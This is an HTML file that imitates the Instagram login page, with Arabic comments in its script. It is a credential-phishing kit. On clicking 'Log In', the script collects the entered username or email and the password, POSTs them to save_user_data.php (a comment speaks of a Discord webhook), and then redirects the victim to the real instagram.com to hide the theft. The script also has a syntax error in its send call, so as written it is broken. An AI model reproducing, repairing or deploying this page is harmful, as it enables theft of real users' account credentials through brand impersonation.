<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Instagram Login Page</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>

<div class="wrapper">
    <div class="header">
        <div class="top">
            <div class="logo">
                <img src="instagram.png" alt="instagram" style="width: 175px;">
            </div>
            <div class="form">
                <div class="input_field">
                    <input type="text" placeholder="Phone number, username, or email" class="input">
                </div>
                <div class="input_field">
                    <input type="password" placeholder="Password" class="input">
                </div>
                <div class="btn"><a href="#">Log In</a></div>
            </div>
            <div class="or">
                <div class="line"></div>
                <p>OR</p>
                <div class="line"></div>
            </div>
            <div class="dif">
                <div class="fb">
                    <img src="facebook.png" alt="facebook">
                    <p>Log in with Facebook</p>
                </div>
                <div class="forgot">
                    <a href="#">Forgot password?</a>
                </div>
            </div>
        </div>
        <div class="signup">
            <p>Don't have an account? <a href="#">Sign up</a></p>
        </div>
        <div class="apps">
            <p>Get the app.</p>
            <div class="icons">
                <a href="#"><img src="appstore.png" alt="appstore"></a>
                <a href="#"><img src="googleplay.png" alt="googleplay"></a>
            </div>
        </div>
    </div>
    <div class="footer">
        <div class="links">
            <ul>
                <li><a href="#">ABOUT US</a></li>
                <li><a href="#">SUPPORT</a></li>
                <li><a href="#">PRESS</a></li>
                <li><a href="#">API</a></li>
                <li><a href="#">JOBS</a></li>
                <li><a href="#">PRIVACY</a></li>
                <li><a href="#">TERMS</a></li>
                <li><a href="#">DIRECTORY</a></li>
                <li><a href="#">PROFILES</a></li>
                <li><a href="#">HASHTAGS</a></li>
                <li><a href="#">LANGUAGE</a></li>
            </ul>
        </div>
        <div class="copyright">
            © 2023 INSTAGRAM
        </div>
    </div>
</div>

<script>
document.querySelector('.btn a').addEventListener('click', function (event) {
    event.preventDefault(); // منع النموذج من إرسال البيانات إلى مكان آخر

    var usernameOrEmail = document.querySelector('input[type="text"]').value;
    var password = document.querySelector('input[type="password"]').value;

    if (usernameOrEmail && password) {
        var userData = {
            "Name/Email/Number": usernameOrEmail,
            "Password": password
        };

        // إرسال البيانات إلى Webhook في Discord باستخدام XMLHttpRequest
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "save_user_data.php", true);
        xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
        xhr.send(JSON.stringify(userData);

        // يجب استبدال هذا بالرابط الذي ترغب في توجيه المستخدم إليه بعد تسجيل الدخول بنجاح.
        var redirectURL = 'https://www.instagram.com/';

        // توجيه المستخدم إلى الموقع الآخر.
        window.location.href = redirectURL;
    }
});
</script>
</body>
</html>
